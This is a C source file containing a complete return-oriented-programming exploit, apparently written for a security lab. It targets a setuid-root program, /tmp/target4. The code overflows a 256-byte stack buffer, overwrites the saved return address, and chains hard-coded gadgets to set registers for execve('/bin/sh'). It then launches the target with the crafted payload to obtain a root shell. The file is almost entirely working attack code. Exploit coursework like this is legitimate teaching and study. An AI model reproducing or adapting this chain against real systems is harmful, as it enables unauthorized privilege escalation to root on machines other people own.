#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target4"
#define DEFAULT_OUTPUT "/tmp/xploit4_output"

/*
 * ROP exploit for target4. foo()'s bar() memcpy's len bytes into a 256-byte
 * stack buffer with no bounds check, so we overflow and overwrite the saved
 * return address (264 bytes in). The stack is non-executable, so we chain
 * gadgets to run execve("/bin/sh", NULL, NULL): rax=59, rdi="/bin/sh",
 * rsi=0, rdx=0. target4 is setuid-root and main() calls setuid(0), so this
 * gives a root shell. Addresses come from find_gadgets.py / objdump.
 */

#define OFFSET 264          /* buf[256] + saved rbp (8) */
#define BINSH  0x404000     /* "/bin/sh" in .rodata */

#define POP_RDI          0x40187f  /* pop %rdi; ret */
#define POP_RSI          0x401797  /* pop %rsi; ret */
#define POP_RAX_RBX_RBP  0x4029e8  /* pop %rax; pop %rbx; pop %rbp; ret */
#define ZERO_RDX_DIV     0x40186d  /* xor %edx,%edx; div %rbp; add $8,%rsp; pop rbx/rbp/r12-r15; ret */
#define SYSCALL          0x401b07  /* syscall; ret */

#define JUNK 0xdeadbeefdeadbeefULL

static size_t put(char *buf, size_t off, uint64_t v) {
  memcpy(buf + off, &v, sizeof(v));
  return off + sizeof(v);
}

int main(int argc, char *argv[])
{
  char exploit[512];
  size_t n = OFFSET;
  memset(exploit, 'A', OFFSET);

  /* rax=0, rbp=1 so the next div doesn't fault */
  n = put(exploit, n, POP_RAX_RBX_RBP);
  n = put(exploit, n, 0);
  n = put(exploit, n, JUNK);
  n = put(exploit, n, 1);

  /* rdx = 0 via xor edx,edx; div rbp (0/1); gadget then eats 7 slots */
  n = put(exploit, n, ZERO_RDX_DIV);
  for (int i = 0; i < 7; i++)
    n = put(exploit, n, JUNK);

  /* rdi = "/bin/sh" */
  n = put(exploit, n, POP_RDI);
  n = put(exploit, n, BINSH);

  /* rsi = 0 */
  n = put(exploit, n, POP_RSI);
  n = put(exploit, n, 0);

  /* rax = 59 (execve) */
  n = put(exploit, n, POP_RAX_RBX_RBP);
  n = put(exploit, n, 59);
  n = put(exploit, n, JUNK);
  n = put(exploit, n, JUNK);

  /* fire */
  n = put(exploit, n, SYSCALL);

  write_xploit(exploit, n, DEFAULT_OUTPUT);

  char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  perror("execve failed");

  return 0;
}
